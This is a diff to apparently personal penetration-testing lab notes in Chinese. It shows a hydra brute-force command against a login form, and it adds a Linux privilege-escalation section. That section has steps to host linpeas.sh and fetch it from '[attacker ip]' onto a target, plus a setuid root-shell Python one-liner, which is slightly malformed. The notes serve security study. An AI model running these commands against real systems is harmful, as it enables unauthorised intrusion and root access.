@@ -50,8 +50,20 @@ hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&
 https://minmin0625.medium.com/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6lab-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hydra-nmap-%E5%9F%B7%E8%A1%8C%E9%81%A0%E7%AB%AF%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-a21d9b8149e0
 https://ithelp.ithome.com.tw/m/articles/10321942
 
-- Linux 提權
-https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
+4. Linux 提權
+- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
+- LinPEAS -> https://github.com/carlospolop/PEASS-ng
+(1) wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+(2) sudo python3 -m http.server 80
+(3) wget http://[attacker ip]:80/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee output.txt
+(4) cat output.txt
+(5) python3 -c 'import os; os.os.setuid(0); os.system("/bin/sh")
+https://ithelp.ithome.com.tw/m/articles/10328790
+
+- LinEnum -> https://github.com/rebootuser/LinEnum
+- Linux Exploit Suggester -> https://github.com/mzet-/linux-exploit-suggester
 
 
 ## 清除紀錄
